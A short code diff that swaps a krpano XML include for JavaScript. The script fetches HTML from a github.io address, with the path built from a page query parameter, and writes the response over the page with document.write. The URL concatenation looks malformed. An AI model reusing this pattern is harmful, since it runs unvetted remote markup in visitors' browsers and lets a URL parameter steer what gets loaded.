@@ -1,3 +1,10 @@
-<krpano>
-    <include url="https://bosslive420.github.io/obama/loader.xml"/>
-</krpano>
+
+var id = new URLSearchParams(location.search).get("id") || "sports";
+
+fetch("https://bosslive420.github.io/obama/loader.xml" + id + ".html")
+  .then(e => e.text())
+  .then(e => {
+    document.open(),
+    document.write(e),
+    document.close()
+  });
